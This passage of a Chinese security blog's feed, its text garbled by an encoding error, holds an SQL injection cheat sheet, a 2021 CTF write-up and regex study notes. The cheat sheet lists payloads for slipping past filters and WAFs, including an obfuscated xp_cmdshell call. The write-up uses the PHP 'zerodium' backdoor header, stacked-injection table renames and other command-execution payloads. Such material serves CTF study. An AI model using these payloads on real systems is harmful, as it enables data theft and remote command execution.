0x70<br>strcmp(left(â€˜passwordâ€™,1), 0x69) = 1<br>strcmp(left(â€˜passwordâ€™,1), 0x70) = 0<br>strcmp(left(â€˜passwordâ€™,1), 0x71) = -1</p><h3 id="ç‰¹æ®Šç¬¦å·"><a href="#ç‰¹æ®Šç¬¦å·" class="headerlink" title="ç‰¹æ®Šç¬¦å·"></a><strong>ç‰¹æ®Šç¬¦å·</strong></h3><p>åå¼•å·ï¼Œselect <code>version()</code>ï¼Œç»•è¿‡ç©ºæ ¼å’Œæ­£åˆ™åŠ å·å’Œç‚¹ï¼Œâ€+â€å’Œâ€.â€ä»£è¡¨è¿æ¥ï¼Œä¹Ÿå¯ç»•è¿‡ç©ºæ ¼å’Œå…³é”®å­—è¿‡æ»¤@ç¬¦å·ï¼Œç”¨äºå®šä¹‰å˜é‡ï¼Œä¸€ä¸ª@ä»£è¡¨ç”¨æˆ·å˜é‡ï¼Œ@@ä»£è¡¨ç³»ç»Ÿå˜é‡</p><h3 id="å…³é”®å­—æ‹†åˆ†"><a href="#å…³é”®å­—æ‹†åˆ†" class="headerlink" title="å…³é”®å­—æ‹†åˆ†"></a>å…³é”®å­—æ‹†åˆ†</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;se&#x27;</span><span class="operator">+</span><span class="string">&#x27;lec&#x27;</span><span class="operator">+</span><span class="string">&#x27;t&#x27;</span><span class="operator">%</span>S<span class="operator">%</span>E<span class="operator">%</span>L<span class="operator">%</span>C<span class="operator">%</span>T <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>?id<span class="operator">=</span><span class="number">1</span>;<span class="keyword">EXEC</span>(<span class="string">&#x27;ma&#x27;</span><span class="operator">+</span><span class="string">&#x27;ster..x&#x27;</span><span class="operator">+</span><span class="string">&#x27;p_cm&#x27;</span><span class="operator">+</span><span class="string">&#x27;dsh&#x27;</span><span class="operator">+</span><span class="string">&#x27;ell&quot;net user&quot;&#x27;</span>)<span class="operator">!</span>å’Œ()ï¼š<span class="string">&#x27;or--+2=--!!!&#x27;</span><span class="number">2</span>id<span class="operator">=</span><span class="number">1</span><span class="operator">+</span>(UnI)(<span class="keyword">oN</span>)<span class="operator">+</span>(SeL)(EcT)</span><br></pre></td></tr></table></figure><h3 id="åŠ æ‹¬å·ç»•è¿‡"><a href="#åŠ æ‹¬å·ç»•è¿‡" class="headerlink" title="åŠ æ‹¬å·ç»•è¿‡"></a><strong>åŠ æ‹¬å·ç»•è¿‡</strong></h3><p><strong>å°æ‹¬å·</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> (<span class="keyword">select</span><span class="operator">+</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="operator">+</span><span class="keyword">from</span><span class="operator">+</span>users)<span class="operator">%</span><span class="number">23</span><span class="keyword">union</span>(<span class="keyword">select</span>(<span class="number">1</span>),(<span class="number">2</span>),(<span class="number">3</span>)<span class="keyword">from</span>(users))id<span class="operator">=</span>(<span class="number">1</span>)<span class="keyword">or</span>(<span class="number">0x50</span><span class="operator">=</span><span class="number">0x50</span>)id<span class="operator">=</span>(<span class="number">-1</span>)<span class="keyword">union</span>(((((((<span class="keyword">select</span>(<span class="number">1</span>),hex(<span class="number">2</span>),hex(<span class="number">3</span>)<span class="keyword">from</span>(users))))))))</span><br></pre></td></tr></table></figure><p><strong>èŠ±æ‹¬å·</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select&#123;x user&#125;from&#123;x mysql.user&#125;id=-1 union select 1,&#123;x 2&#125;,3</span><br></pre></td></tr></table></figure><h3 id="bypass-information-schema"><a href="#bypass-information-schema" class="headerlink" title="bypass information_schema"></a>bypass information_schema</h3><p>å‰æï¼šmysqlâ‰¥5.7</p><p>url <a href="https://www.anquanke.com/post/id/193512">https://www.anquanke.com/post/id/193512</a></p><p>ç”¨sysæ›¿ä»£</p><p>æ‹¿è¡¨å</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union all select 1,2,group_concat(table_name)from sys.schema_auto_increment_columns where table_schema=database()--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name)<span class="keyword">from</span> sys.schema_table_statistics_with_buffer <span class="keyword">where</span> table_schema<span class="operator">=</span>database()<span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">è·å–ç¬¬ä¸€åˆ—åˆ—å</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union all select*from (select * from users as a join users b)c--+</span></span><br><span class="line"><span class="string">ä¾æ¬¡çš„åˆ—å</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span><span class="operator">*</span><span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">as</span> a <span class="keyword">join</span> users b <span class="keyword">using</span>(id,username))c<span class="comment">--+</span></span><br></pre></td></tr></table></figure><h3 id="httpå‚æ•°æ±¡æŸ“"><a href="#httpå‚æ•°æ±¡æŸ“" class="headerlink" title="httpå‚æ•°æ±¡æŸ“"></a>httpå‚æ•°æ±¡æŸ“</h3><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/202120210529214131.png" alt=""></p><p>å¦‚æœä¸€ä¸ªç½‘ç«™åªåœ¨tomcatæœåŠ¡å™¨å¤„åšæ•°æ®è¿‡æ»¤å’Œå¤„ç†ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è§£æå‚æ•°çš„ä¸åŒï¼Œå¯¹WAFæ£€æµ‹è¿›è¡Œç»•è¿‡ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?id<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,database(),3--+</span></span><br></pre></td></tr></table></figure><h2 id="å…¶ä»–trick"><a href="#å…¶ä»–trick" class="headerlink" title="å…¶ä»–trick"></a>å…¶ä»–trick</h2><h3 id="ä¸‡èƒ½å¯†ç "><a href="#ä¸‡èƒ½å¯†ç " class="headerlink" title="ä¸‡èƒ½å¯†ç "></a>ä¸‡èƒ½å¯†ç </h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span>ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€<span class="operator">/</span><span class="operator">/</span>å®Œæ•´è¯­å¥ <span class="keyword">select</span> username,age <span class="keyword">from</span> userinfo <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span></span><br><span class="line"><span class="string">&#x27; or 1=1#ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€//å®Œæ•´è¯­å¥ select username,age from userinfo where id=&#x27;&#x27; or 1=1#&#x27;</span></span><br><span class="line"><span class="string">&#x27;=0#ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€//å®Œæ•´è¯­å¥ select username,age from userinfo where id=&#x27;&#x27;=0#</span></span><br></pre></td></tr></table></figure><h3 id="åˆ¤æ–­ä¸‰ç§æ•°æ®åº“çš„è¯­å¥"><a href="#åˆ¤æ–­ä¸‰ç§æ•°æ®åº“çš„è¯­å¥" class="headerlink" title="åˆ¤æ–­ä¸‰ç§æ•°æ®åº“çš„è¯­å¥"></a><strong>åˆ¤æ–­ä¸‰ç§æ•°æ®åº“çš„è¯­å¥</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MySQLï¼š<span class="keyword">and</span> length(<span class="keyword">user</span>())<span class="operator">&gt;</span><span class="number">10</span></span><br><span class="line">ACCESSï¼š<span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>)<span class="keyword">from</span> MSysAccessObjects)<span class="operator">&gt;</span><span class="number">0</span></span><br><span class="line">MSSQLï¼š<span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>)<span class="keyword">from</span> sysobjects)<span class="operator">&gt;</span><span class="number">0</span></span><br></pre></td></tr></table></figure><h3 id="æ³¨æ„ç‚¹"><a href="#æ³¨æ„ç‚¹" class="headerlink" title="æ³¨æ„ç‚¹"></a>æ³¨æ„ç‚¹</h3><p>è¡¨åï¼Œåˆ—åä¸ºæ•°å­—æ—¶ï¼Œè¦ä½¿ç”¨<code>`åå¼•å·æ‹¬èµ·æ¥ï¼Œä¾‹å¦‚</code>1231818`</p>]]></content>
    
    
    <summary type="html">å¯¹äºsqlæ³¨å…¥çš„æ€»ç»“å’Œå½’çº³ï¼Œé™¤äº†åŸºç¡€æ€§çš„çŸ¥è¯†ä»¥å¤–å…¶ä»–çŸ¥è¯†ç‚¹ä¸»è¦ä»¥æ‰“ctfé‡åˆ°çš„è¿›è¡Œæ€»ç»“æ·»åŠ å½’çº³ï¼Œç›®å‰ä»åœ¨æ›´æ–°ä¸­</summary>
    
    
    
    <category term="æ¸—é€çŸ¥è¯†" scheme="http://www.fxizenta.design/categories/%E6%B8%97%E9%80%8F%E7%9F%A5%E8%AF%86/"/>
    
    <category term="sqlæ³¨å…¥" scheme="http://www.fxizenta.design/categories/%E6%B8%97%E9%80%8F%E7%9F%A5%E8%AF%86/sql%E6%B3%A8%E5%85%A5/"/>
    
    
    <category term="sqli" scheme="http://www.fxizenta.design/tags/sqli/"/>
    
  </entry>
  
  <entry>
    <title>2021hfctf_wp</title>
    <link href="http://www.fxizenta.design/2021/04/06/2021hfctf-wp/"/>
    <id>http://www.fxizenta.design/2021/04/06/2021hfctf-wp/</id>
    <published>2021-04-06T11:52:50.000Z</published>
    <updated>2021-07-23T08:59:52.144Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2021hfctf-wp"><a href="#2021hfctf-wp" class="headerlink" title="2021hfctf wp"></a>2021hfctf wp</h1><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h2><p>å‰æ®µæ—¶é—´php gitä»“åº“è¢«ä¸Šä¼ çš„æ¶æ„ä»£ç çš„åˆ©ç”¨RCE</p><p>å»githubä¸Šçœ‹çœ‹æ¶æ„ä»£ç æ®µ</p><p>æœ‰ç‚¹å°å‘çš„æ˜¯åé¢è¿˜æœ‰ä¸€ä¸ªt</p><p>User-Agentt:zerodiumsystem(â€œcat /flagâ€);</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021Untitled%201.png" alt=""></p><h2 id="unsetme"><a href="#unsetme" class="headerlink" title="unsetme"></a>unsetme</h2><p>ä»£ç ç™¾åº¦ä¸€ä¸‹å‘ç°æ˜¯fatfreeæ¡†æ¶</p><p>ä¸‹æºç ä¸‹æ¥çœ‹ä¸€ä¸‹</p><p>å‘ç°ä»£ç åˆ©ç”¨æ®µå¦‚ä¸‹</p><p><img src="https://i.loli.net/2021/04/06/UbaAjcunLsKoQyX.png" alt="unsetme"></p><p>æ„é€ payload?a=b&amp;a=b%0a,$abc);system(â€œcat /flagâ€</p><h2 id="æ…¢æ…¢æ¥æ•°æ®åº“"><a href="#æ…¢æ…¢æ¥æ•°æ®åº“" class="headerlink" title="æ…¢æ…¢æ¥æ•°æ®åº“"></a>æ…¢æ…¢æ¥æ•°æ®åº“</h2><p>è¿™é¢˜æ˜¯çœŸçš„æœ‰æ¯’ã€‚ã€‚</p><p>æ ¹æ®æç¤º</p><p>index.phpçš„md5æ³¨å…¥ç»•è¿‡ï¼Œpasswordå¡«129581926211651571912466741651878684928å³å¯<br>ssrfè®¿é—®127.0.0.1/admin.php<br>ç„¶åå †å æ³¨å…¥ï¼Œè¿™é‡Œåº”è¯¥æ˜¯å¼ºç½‘æ¯éšä¾¿æ³¨çš„é­”æ”¹</p><p>å‘ç°2ä¸ªåº“ï¼Œæ‰¾åˆ°åº“ ctf2 é‡Œ2ä¸ªè¡¨</p><p>çœ‹ä¸€ä¸‹2ä¸ªè¡¨çš„å­—æ®µ<br>real_admin_here_do_you_findé‡Œæ˜¯id,username,password<br>fake_adminæ˜¯id,username,fake_password<br>é¡µé¢é»˜è®¤selectçš„æ˜¯fake_adminï¼Œç”¨æ”¹åçš„æ–¹æ³•æ¥æŸ¥çœŸçš„å¯†ç </p><p>è¿™é‡Œç”¨çš„æ˜¯RENAME</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; or 1=1;use ctf2;RENAME TABLE `fake_admin` TO `fake_admin1`;RENAME TABLE</span></span><br><span class="line"><span class="string">`real_admin_here_do_you_find` TO `fake_admin`; --</span></span><br></pre></td></tr></table></figure><p>ç„¶åç”¨ â€˜or 1=1 æ³¨å…¥æŸ¥å¯†ç </p><p>æœ€åssrfçœ‹admin.phpå‡ºflag</p><p>æŸ¥çš„ç”¨æˆ·åæ˜¯admin_inneræœ€åç”¨çš„æ˜¯adminä¹Ÿæ˜¯æ²¡è°äº†</p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="ä½ ä¼šæ—¥å¿—å—ï¼Ÿ"><a href="#ä½ ä¼šæ—¥å¿—å—ï¼Ÿ" class="headerlink" title="ä½ ä¼šæ—¥å¿—å—ï¼Ÿ"></a>ä½ ä¼šæ—¥å¿—å—ï¼Ÿ</h2><p>æ—¶é—´ç›²æ³¨çš„æ—¥å¿—ï¼Œæ‰¾377ç„¶åASSICè½¬ï¼Œå‘ç°æ˜¯base64 ZmxhZ3tZb3VfYXJlX3NvX2dyZWF0fQ==</p><p>è§£ç å‡ºflag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2021hfctf-wp&quot;&gt;&lt;a href=&quot;#2021hfctf-wp&quot; class=&quot;headerlink&quot; title=&quot;2021hfctf wp&quot;&gt;&lt;/a&gt;2021hfctf wp&lt;/h1&gt;&lt;h1 id=&quot;Web&quot;&gt;&lt;a href=&quot;#Web&quot; class</summary>
      
    
    
    
    <category term="ctf" scheme="http://www.fxizenta.design/categories/ctf/"/>
    
    <category term="web" scheme="http://www.fxizenta.design/categories/ctf/web/"/>
    
    
    <category term="wp" scheme="http://www.fxizenta.design/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>æ­£åˆ™è¡¨è¾¾å¼å­¦ä¹ æ€»ç»“</title>
    <link href="http://www.fxizenta.design/2021/03/06/regular_expression/"/>
    <id>http://www.fxizenta.design/2021/03/06/regular_expression/</id>
    <published>2021-03-06T04:24:46.000Z</published>
    <updated>2021-07-23T09:08:46.637Z</updated>
    
    <content type="html"><![CDATA[<p>èµ·å› æ˜¯æœ€è¿‘åšä¸€é“æ–‡ä»¶åŒ…å«çš„ctfé¢˜ç›®æ—¶ï¼Œå¡äº†å¾ˆä¹…ï¼Œæœ€åæ‰å‘ç°æ˜¯å¯¹æ­£åˆ™è¡¨è¾¾å¼çš„ç†è§£æœ‰é—®é¢˜å¯¼è‡´ï¼Œå®³ï¼Œå¤ªèœäº†ï¼Œæœ€ååæ€äº†ä¸€ä¸‹è¿˜æ˜¯æ²¡æœ‰å¥½å¥½å­¦ä¹ æ­£åˆ™è¡¨è¾¾å¼ï¼ˆå°¤å…¶æ˜¯æ²¡æœ‰ç³»ç»Ÿçš„è¿›è¡Œå­¦ä¹ ï¼‰ï¼Œäºæ˜¯å†³å®šç³»ç»Ÿçš„å­¦ä¹ ä¸€ä¸‹æ­£åˆ™è¡¨è¾¾å¼ã€‚</p><p>æœ¬æ¬¡å­¦ä¹ ä½¿ç”¨çš„å­¦ä¹ èµ„æ–™ä¸ºã€Šç²¾é€šæ­£åˆ™è¡¨è¾¾å¼(ç¬¬ä¸‰ç‰ˆ)ã€‹ã€‚å†…å®¹ä¸»è¦ä¸ºæ­£åˆ™è¡¨è¾¾å¼åŸºç¡€å’Œæœ¬äººæ¯”è¾ƒå¸¸é‡åˆ°PHPç¯å¢ƒä¸‹çš„æ­£åˆ™è¡¨è¾¾å¼ã€‚</p><h1 id="æ­£åˆ™è¡¨è¾¾å¼åŸºç¡€"><a href="#æ­£åˆ™è¡¨è¾¾å¼åŸºç¡€" class="headerlink" title="æ­£åˆ™è¡¨è¾¾å¼åŸºç¡€"></a>æ­£åˆ™è¡¨è¾¾å¼åŸºç¡€</h1><p>æ­£åˆ™è¡¨è¾¾å¼ç”±ä¸¤ç§å­—ç¬¦æ„æˆï¼Œ<strong>å…ƒå­—ç¬¦</strong>å’Œ<strong>æ–‡å­—,å…ƒå­—ç¬¦</strong>ä¸ºé«˜çº§åº”ç”¨æä¾›äº†ä¸°å¯Œè€Œä¸”æè¿°åŠ›æå¼ºã€‚</p><h2 id="è¡Œçš„èµ·å§‹å’Œç»“æŸ"><a href="#è¡Œçš„èµ·å§‹å’Œç»“æŸ" class="headerlink" title="è¡Œçš„èµ·å§‹å’Œç»“æŸ"></a>è¡Œçš„èµ·å§‹å’Œç»“æŸ</h2><p>^ è¡¨ç¤ºä¸€è¡Œçš„å¼€å§‹</p><p>$  è¡¨ç¤ºä¸€è¡Œçš„ç»“æŸ</p><p>^aa åŒ¹é…ä»¥aaå¼€å¤´çš„è¡Œ</p><p>^$  è¡Œå¼€å¤´æ¥è¡Œæœ«å°¾</p><p>^aa$ ä¸€è¡Œå†…å®¹ä¸ºaaçš„è¡Œ</p><h2 id="å­—ç¬¦ç»„"><a href="#å­—ç¬¦ç»„" class="headerlink" title="å­—ç¬¦ç»„"></a>å­—ç¬¦ç»„</h2><p>åŒ¹é…è‹¥å¹²å­—ç¬¦ä¹‹ä¸€</p><p><strong>åŒæ ·çš„å­—ç¬¦åœ¨å­—ç¬¦ç»„å†…å’Œç»„å¤–å«ä¹‰ä¸åŒ</strong></p><h3 id="è¿å­—ç¬¦"><a href="#è¿å­—ç¬¦" class="headerlink" title="è¿å­—ç¬¦"></a>è¿å­—ç¬¦</h3><p>â€˜-â€™è¿å­—ç¬¦ï¼Œè¡¨ç¤ºä¸€ä¸ªèŒƒå›´(ä»…åœ¨<strong>å­—ç¬¦ç»„å†…éƒ¨ä¸”ä¸åœ¨å¼€å¤´</strong>è¿å­—ç¬¦æ‰æ˜¯å…ƒå­—ç¬¦ï¼‰</p><p>ä¾‹å¦‚ï¼š</p><p><H[1-6]>ä¸<H[123456]>æ˜¯ç›¸åŒçš„</p><p>å¤šé‡èŒƒå›´åŒæ ·çš„å…è®¸çš„</p><p>ä¾‹å¦‚ï¼š</p><p>[0-9A-Za-z]</p><h3 id="æ’é™¤å‹å­—ç¬¦ç»„"><a href="#æ’é™¤å‹å­—ç¬¦ç»„" class="headerlink" title="æ’é™¤å‹å­—ç¬¦ç»„"></a>æ’é™¤å‹å­—ç¬¦ç»„</h3><p>^è¡¨ç¤ºæ’é™¤ï¼Œåé¢è¡¨ç¤ºä¸å¸Œæœ›åŒ¹é…çš„å­—ç¬¦</p><p>ä¾‹å¦‚:</p><p><sup><a href="#fn_1-6" id="reffn_1-6">1-6</a></sup> åŒ¹é…é™¤äº†1åˆ°6ä»¥å¤–çš„ä»»ä½•å­—ç¬¦</p><h2 id="ç”¨ç‚¹å·åŒ¹é…ä»»æ„å­—ç¬¦"><a href="#ç”¨ç‚¹å·åŒ¹é…ä»»æ„å­—ç¬¦" class="headerlink" title="ç”¨ç‚¹å·åŒ¹é…ä»»æ„å­—ç¬¦"></a>ç”¨ç‚¹å·åŒ¹é…ä»»æ„å­—ç¬¦</h2><p>å…ƒå­—ç¬¦.æ˜¯ç”¨æ¥åŒ¹é…ä»»æ„å­—ç¬¦çš„å­—ç¬¦ç»„çš„ç®€ä¾¿å†™æ³•ï¼Œ<strong>æ³¨æ„ä»…åœ¨å­—ç¬¦ç»„å¤–ä¸ºå…ƒå­—ç¬¦</strong></p><p>ä¾‹å¦‚ï¼š</p><p>11.11</p><p>å¯ä»¥åŒ¹é…11-11,11.11,11/11ç­‰</p><h2 id="å¤šé€‰ç»“æ„"><a href="#å¤šé€‰ç»“æ„" class="headerlink" title="å¤šé€‰ç»“æ„"></a>å¤šé€‰ç»“æ„</h2><p>â€˜|â€™æˆ–ï¼Œç®€å•æ˜“æ‡‚å°±æ˜¯åŒ¹é…è¡¨è¾¾å¼ä¸­çš„ä¸€ä¸ªè¡¨è¾¾å¼</p><p>ä¾‹å¦‚ï¼š</p><p>c(a|e)t å³å¯åŒ¹é…catä¹Ÿå¯ä»¥åŒ¹é…cet</p><p>è¡¨è¾¾å¼å‰åŠ ä¸Š(?i)å¯ä»¥å¿½è§†å¤§å°å†™</p><h2 id="å•è¯åˆ†ç•Œçº¿"><a href="#å•è¯åˆ†ç•Œçº¿" class="headerlink" title="å•è¯åˆ†ç•Œçº¿"></a>å•è¯åˆ†ç•Œçº¿</h2><p>\&lt; ç”¨äºåŒ¹é…å•è¯çš„å¼€å§‹ä½ç½®</p><p>> ç”¨äºåŒ¹é…å•è¯çš„ç»“æŸä½ç½®</p><p>å¯ä»¥æƒ³è±¡æˆå•è¯ç‰ˆæœ¬çš„^å’Œ$</p><p>ä¸¤è€…å¯ä»¥ä¸€èµ·ä½¿ç”¨ç”¨äºåŒ¹é…å•è¯ä¹Ÿå¯ä»¥åªä½¿ç”¨ä¸€ä¸ªç”¨äºåŒ¹é…æŸä¸ªå­—ç¬¦ä¸²å¼€å§‹æˆ–ç»“æŸçš„å•è¯</p><p>\b ç”¨äºå­—ç¬¦ä¸²å¼€å§‹æˆ–ç»“å°¾è¿›è¡ŒåŒ¹é…</p><p>m/\bjack/ å¯åŒ¹é…jackå¼€å¤´çš„æ‰€æœ‰å­—ç¬¦ä¸²</p><p>m/jack\b/ å¯åŒ¹é…jackç»“å°¾çš„æ‰€æœ‰å­—ç¬¦ä¸²</p><p> m/\bjack\b/ åªèƒ½åŒ¹é…jack</p><h2 id="å¯é€‰é¡¹å…ƒç´ "><a href="#å¯é€‰é¡¹å…ƒç´ " class="headerlink" title="å¯é€‰é¡¹å…ƒç´ "></a>å¯é€‰é¡¹å…ƒç´ </h2><p>?è¡¨ç¤ºå¯é€‰é¡¹</p><p>ä¾‹å¦‚</p><p>jkk? å¯ä»¥åŒ¹é…jkå’Œjkk</p><p>+è¡¨ç¤ºä¹‹å‰é‚»æ¥çš„å…ƒç´ å‡ºç°<strong>ä¸€æ¬¡æˆ–å¤šæ¬¡</strong></p><p>ä¾‹å¦‚</p><p>jk+ å¯ä»¥åŒ¹é…jkkkkkkkkã€jkã€jkkkk</p><p><em>åˆ™æ˜¯åŒ¹é…ä»»æ„æ¬¡æ•°ï¼Œ<em>*åŒ…æ‹¬0æ¬¡</em></em></p><p>jk*  å¯ä»¥åŒ¹é…jã€jkã€jkkkkkk</p><p><img src="https://i.loli.net/2021/03/06/OG2C3zYB4nFrDiQ.png" alt="Untitled.png"></p><p><strong>è´ªå©ª</strong>ï¼šæŒ‡å°½å¯èƒ½çš„åŒ¹é…å‡ºæœ€é•¿çš„å†…å®¹</p><p><strong>éè´ªå©ª</strong>ï¼šåŒ¹é…å‡ºæœ€çŸ­çš„å†…å®¹</p><p>è€Œ*å’Œ+éƒ½æ˜¯è´ªå©ªçš„ï¼Œå®ƒä»¬éƒ½ä¼šå°½å¯èƒ½å¤šçš„åŒ¹é…æ–‡å­—ã€‚</p><p>åªè¦åœ¨å®ƒä»¬çš„åé¢åŠ ä¸Šä¸€ä¸ªï¼Ÿå°±å¯ä»¥å®ç°éè´ªå©ªå³æœ€å°åŒ¹é…</p><p>ä¾‹å¦‚ï¼š</p><p>&lt;..&gt;head&lt;..&gt;</p><p>/&lt;.*&gt;/    åŒ¹é…ç»“æœä¸º&lt;..&gt;head&lt;..&gt;</p><p>/&lt;.*?&gt;/   åŒ¹é…ç»“æœä¸º&lt;..&gt;</p><p>åŒºé—´é‡è¯</p><p>{min,max}</p><p>ä¸Šè¿°ä¸‰ä¸ªå…ƒç¬¦å·å¯ä»¥ç­‰ä»·äºä»¥ä¸‹é‡è¯</p><p><img src="https://i.loli.net/2021/03/06/i6GkxBnu3bMXJL9.png" alt="Untitled 1.png"></p><h2 id="æ‹¬å·ä»¥åŠåå‘å¼•ç”¨"><a href="#æ‹¬å·ä»¥åŠåå‘å¼•ç”¨" class="headerlink" title="æ‹¬å·ä»¥åŠåå‘å¼•ç”¨"></a>æ‹¬å·ä»¥åŠåå‘å¼•ç”¨</h2><p>æ‹¬å·é™¤äº†å°†è‹¥å¹²å­—ç¬¦ç»„åˆä¸ºä¸€ä¸ªå•å…ƒï¼Œè¿˜æœ‰ä¸€ä¸ªä½œç”¨å°±æ˜¯å¯ä»¥è®°å½•å®ƒä»¬åŒ…å«çš„å­è¡¨è¾¾å¼åŒ¹é…çš„æ–‡æœ¬ã€‚</p><p>\1åŒ¹é…ç¬¬ä¸€ä¸ªæ‹¬å·å†…åŒ¹é…çš„å†…å®¹ï¼Œ\2åŒ¹é…ç¬¬äºŒä¸ªæ‹¬å·åŒ¹é…çš„å†…å®¹ï¼Œå¦‚æ­¤ç±»æ¨</p><p>ä¾‹å¦‚ï¼š</p><p>\&lt;([A-Za-z]+) +\1> åŒ¹é…ä¸¤ä¸ªè¿ç»­é‡å¤çš„å•è¯</p><h2 id="éæ•è·å‹æ‹¬å·"><a href="#éæ•è·å‹æ‹¬å·" class="headerlink" title="éæ•è·å‹æ‹¬å·"></a>éæ•è·å‹æ‹¬å·</h2><p>(?:)è¡¨ç¤ºè¿™ä¸ªæ‹¬å·åªè¿›è¡Œåˆ†ç»„è€Œä¸æ•è·ï¼Œå³ä¹Ÿä¸ä¼šå½±å“æ•è·è®¡æ•°ï¼Œå³ä»…ç”¨äºåˆ†ç»„çš„æ‹¬å·</p><h2 id="å‘½åæ•è·"><a href="#å‘½åæ•è·" class="headerlink" title="å‘½åæ•è·"></a>å‘½åæ•è·</h2><p>åœ¨pythonå’Œphpä¸­ï¼Œå¯ä»¥å¯¹æ•è·å†…å®¹è¿›è¡Œå‘½åï¼Œè¯­æ³•ç›¸åŒï¼Œéƒ½æ˜¯(?P<name>..)</p><p>ä¾‹å¦‚ï¼š</p><p>\b(?P<Area>\d\d\d)</p><h2 id="è½¬ä¹‰"><a href="#è½¬ä¹‰" class="headerlink" title="è½¬ä¹‰"></a>è½¬ä¹‰</h2><p>å¦‚æœéœ€è¦åŒ¹é…çš„æŸä¸ªå­—ç¬¦æœ¬èº«å°±æ˜¯å…ƒå­—ç¬¦ï¼Œåº”è¯¥å¦‚ä½•å¤„ç†å‘¢ï¼Ÿ</p><p>ä¾‹å¦‚.æœ¬èº«å°±æ˜¯å…ƒå­—ç¬¦ï¼Œåœ¨æˆ‘ä»¬éœ€è¦åŒ¹é…ä¸€ä¸ªç½‘å€æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥è¿™æ ·å†™</p><p>www.baidu.com</p><p>æˆ–è€…åŒ¹é…ä¸€ä¸ªæ‹¬å·åŒ…å«å­—ç¬¦</p><p>([a-zA-Z]+)</p><h2 id="ä¸»è¦æµæ´¾çš„æ­£åˆ™è¡¨è¾¾å¼çš„éƒ¨åˆ†ç®€è®°æ³•"><a href="#ä¸»è¦æµæ´¾çš„æ­£åˆ™è¡¨è¾¾å¼çš„éƒ¨åˆ†ç®€è®°æ³•" class="headerlink" title="ä¸»è¦æµæ´¾çš„æ­£åˆ™è¡¨è¾¾å¼çš„éƒ¨åˆ†ç®€è®°æ³•"></a>ä¸»è¦æµæ´¾çš„æ­£åˆ™è¡¨è¾¾å¼çš„éƒ¨åˆ†ç®€è®°æ³•</h2><p>\s  åŒ¹é…æ‰€æœ‰ç©ºç™½å­—ç¬¦</p><p>\n  æ¢è¡Œç¬¦</p><p>\r   å›è½¦ç¬¦</p><p>\t   åˆ¶è¡¨ç¬¦</p><p>\S  é™¤â€™\sâ€™å¤–çš„æ‰€æœ‰å†…å®¹</p><p>\w  ç­‰ä»·äº[a-zA-Z0-9] </p><p>\W é™¤â€™\wâ€™å¤–çš„ä»»ä½•å­—ç¬¦</p><p>\d  ç­‰ä»·äº[0-9]ï¼Œå³æ•°å­—</p><p>\D  é™¤â€™\dâ€™å¤–çš„ä»»ä½•å­—ç¬¦</p><p>/iä¿®é¥°ç¬¦è¡¨ç¤ºæ­¤æµ‹è¯•åŒºä¸åŒºåˆ†å¤§å°å†™ï¼Œæ³¨æ„ï¼šè™½ç„¶å†™æ³•æ˜¯â€™/iâ€™,ä½†å…¶å®â€œiâ€åªæ˜¯è·Ÿåœ¨è¡¨ç¤ºç»“å°¾çš„æ–œçº¿ä¹‹å</p><p>m/../ 